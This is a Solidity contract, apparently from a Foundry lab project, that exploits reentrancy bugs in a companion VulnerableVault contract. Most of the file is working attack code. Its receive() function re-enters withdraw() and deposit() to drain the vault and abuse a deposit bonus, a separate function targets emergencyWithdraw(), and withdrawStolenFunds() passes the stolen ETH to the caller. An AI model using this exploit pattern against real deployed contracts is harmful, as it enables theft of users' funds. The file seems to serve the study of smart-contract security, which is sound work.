// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableVault.sol";
import "../interfaces/IAttacker.sol";
import "forge-std/console.sol";

/**
 * @title Attacker
 * @dev Contract that exploits the reentrancy bugs in VulnerableVault
 * 
 * Attack strategies:
 * 1. Reentrancy in withdraw() - multiple withdrawals
 * 2. Reentrancy in deposit() - infinite bonus
 * 3. Reentrancy in emergencyWithdraw() - complete drain
 */
contract Attacker is IAttacker {
    VulnerableVault public override vault;
    uint256 public override attackCount;
    uint256 public override totalStolen;
    
    constructor(address payable _vault) {
        vault = VulnerableVault(_vault);
    }
    
    // Function to start the attack
    function attack() external payable override {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        
        console.log("Starting reentrancy attack...");
        console.log("Initial attacker balance:", address(this).balance);
        console.log("Initial vault balance:", vault.getContractBalance());
        
        // Step 1: Deposit ETH to have balance
        vault.deposit{value: msg.value}();
        
        console.log("Balance after deposit:", vault.getBalance(address(this)));
        
        // Step 2: Execute reentrancy in withdraw
        attackCount = 0;
        totalStolen = 0;
        
        // Start the reentrancy attack
        vault.withdraw(msg.value);
        
        console.log("Attack completed!");
        console.log("Total stolen:", totalStolen);
        console.log("Final vault balance:", vault.getContractBalance());
        
        emit AttackCompleted(totalStolen);
    }
    
    // Function to attack deposit bonus
    function attackDepositBonus() external payable override {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        
        console.log("Attacking deposit bonus...");
        
        // Exploit deposit bonus with reentrancy
        vault.deposit{value: msg.value}();
        
        console.log("Bonus exploited!");
    }
    
    // Function to attack emergencyWithdraw
    function attackEmergencyWithdraw() external payable override {
        require(msg.value > 0, "Need ETH to attack");
        
        console.log("Attacking emergencyWithdraw...");
        
        // Deposit to activate deposit state
        vault.deposit{value: msg.value}();
        
        // Exploit emergencyWithdraw
        vault.emergencyWithdraw();
        
        console.log("Emergency withdraw exploited!");
    }
    
    // receive() function - KEY ATTACK POINT
    receive() external payable override {
        console.log("Receive called with:", msg.value);
        console.log("Attack count:", attackCount);
        
        totalStolen += msg.value;
        attackCount++;
        
        emit AttackExecuted(attackCount, msg.value);
        
        // ❌ ATTACK: Reentrancy in withdraw
        // While the vault state hasn't been updated,
        // we can call withdraw() again
        if (attackCount < 5 && address(vault).balance >= msg.value) {
            console.log("Executing reentrancy...");
            vault.withdraw(msg.value);
        }
        
        // ❌ ATTACK: Reentrancy in deposit bonus
        // We can also exploit the deposit bonus
        if (attackCount < 3 && address(this).balance >= 1 ether) {
            console.log("Exploiting deposit bonus...");
            vault.deposit{value: 1 ether}();
        }
    }
    
    // Function to withdraw stolen ETH
    function withdrawStolenFunds() external override {
        uint256 balance = address(this).balance;
        require(balance > 0, "No funds to withdraw");
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        console.log("Stolen ETH withdrawn:", balance);
    }
    
    // Function to get attack statistics
    function getAttackStats() external view override returns (uint256, uint256, uint256) {
        return (attackCount, totalStolen, address(this).balance);
    }
    
    // Function to get vault balance
    function getVaultBalance() external view override returns (uint256) {
        return vault.getContractBalance();
    }
    
    // Function to get attacker balance in vault
    function getVaultUserBalance() external view override returns (uint256) {
        return vault.getBalance(address(this));
    }
}
